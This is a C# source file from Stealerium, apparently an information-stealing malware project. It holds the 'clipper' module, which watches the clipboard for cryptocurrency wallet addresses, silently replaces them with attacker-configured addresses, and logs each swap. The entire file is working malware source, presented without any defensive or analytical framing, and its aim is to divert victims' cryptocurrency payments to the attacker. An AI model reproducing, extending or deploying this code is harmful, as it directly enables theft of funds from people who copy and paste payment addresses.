using Stealerium.Helpers;

namespace Stealerium.Clipper
{
    /// <summary>
    /// The Buffer class is responsible for monitoring and replacing cryptocurrency addresses
    /// found in the clipboard with predefined addresses.
    /// </summary>
    internal sealed class Buffer
    {
        /// <summary>
        /// Finds and replaces cryptocurrency addresses in the clipboard content.
        /// </summary>
        public static void Replace()
        {
            // Retrieve the current clipboard text content
            var clipboardContent = Clipboard.GetText();

            // If clipboard is empty or null, exit the method
            if (string.IsNullOrEmpty(clipboardContent))
            {
                return;
            }

            // Iterate over the list of cryptocurrency patterns
            foreach (var dictionaryEntry in RegexPatterns.PatternsList)
            {
                var cryptocurrency = dictionaryEntry.Key;
                var pattern = dictionaryEntry.Value;

                // Check if the clipboard content matches the cryptocurrency address pattern
                if (pattern.Match(clipboardContent).Success)
                {
                    // Get the replacement address for the matched cryptocurrency
                    var replaceTo = Config.ClipperAddresses.ContainsKey(cryptocurrency)
                        ? Config.ClipperAddresses[cryptocurrency]
                        : null;

                    // Replace the address in the clipboard if the replacement is valid
                    if (!string.IsNullOrEmpty(replaceTo) && !replaceTo.Contains("---") && !clipboardContent.Equals(replaceTo))
                    {
                        Clipboard.SetText(replaceTo);  // Set the new clipboard content
                        Logging.Log($"Clipper replaced to {replaceTo}");  // Log the replacement
                        return;  // Exit after the first successful replacement
                    }
                }
            }
        }
    }
}
